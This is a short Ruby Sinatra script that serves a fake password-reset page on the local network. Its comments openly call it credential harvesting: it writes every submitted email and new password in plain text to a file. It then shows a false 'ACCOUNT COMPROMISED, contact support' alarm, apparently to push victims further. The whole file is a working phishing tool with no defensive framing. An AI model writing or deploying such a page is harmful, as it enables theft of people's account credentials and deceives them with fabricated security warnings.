require 'sinatra'     # Loads the Sinatra web framework.
require 'launchy'     # Lets us open a URL in the default browser.
require 'socket'      # Needed to get the local IP address.

set :bind, '0.0.0.0'  # Binds the app to all IPs (makes it accessible on the network).
set :port, 4567       # Sets the server to run on port 4567.
# Function to get the local IP address of the machine.
def local_ip
  UDPSocket.open { |s| s.connect('8.8.8.8', 1); s.addr.last }
end
# Launches the app in the default browser after a 1-second delay
Thread.new { sleep 1; Launchy.open("http://#{local_ip}:#{settings.port}") }

# Route for GET requests to the root URL.
get '/' do
  <<~HTML
  <style>
    body {background:#e6e0f8; font-family:sans-serif; text-align:center; padding:50px;}
    input {margin:10px; padding:10px; width:280px; border-radius:5px; border:1px solid #555;}
    input[type=submit] {background:#6a4c93; color:#fff; font-weight:bold; cursor:pointer; width:300px;}
  </style>
  <h2>Password Reset</h2>
  <!-- Password reset form -->
  <form method="POST" action="/reset">
    <input type="email" name="email" placeholder="Email" required><br>
    <input type="password" name="new_password" placeholder="New Password" required><br>
    <input type="submit" value="Reset Password">
  </form>
  HTML
end
# Requests to /resets.
post '/reset' do
  # Saves the submitted email and password to a file (Credential harvesting).
  File.open('Credentials.txt', 'a') { |f| f.puts "Email: #{params[:email]} | Password: #{params[:new_password]}" }

  # Sends back a warning message as a fake response.
  <<~HTML
  <style>
    body {background:#ff6f3c; color:#fff3e6; font-family:monospace; text-align:center; padding:60px;}
    h1 {font-size:48px; margin-bottom:20px;}
  </style>
  <h1>!!! ACCOUNT COMPROMISED !!!</h1>
  <p>Contact support immediately!</p>
  HTML
end